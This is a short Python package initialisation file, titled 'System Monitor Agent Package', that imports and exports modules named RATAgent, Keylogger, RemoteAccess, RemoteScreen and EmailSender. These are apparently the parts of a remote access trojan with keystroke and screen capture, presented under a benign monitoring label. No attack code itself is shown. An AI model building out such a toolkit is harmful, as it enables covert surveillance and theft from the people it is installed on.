# System Monitor Agent Package
from .agent import RATAgent
from .emailer import EmailSender
from .logger import LogCapture
from .remote import RemoteAccess
from .keylogger import Keylogger
from .screen import RemoteScreen
from .config import Config
from .database import init_db, get_db_connection

__version__ = "1.1.0"
__all__ = ['RATAgent', 'EmailSender', 'LogCapture', 'RemoteAccess', 'Keylogger', 'RemoteScreen', 'Config', 'init_db', 'get_db_connection']
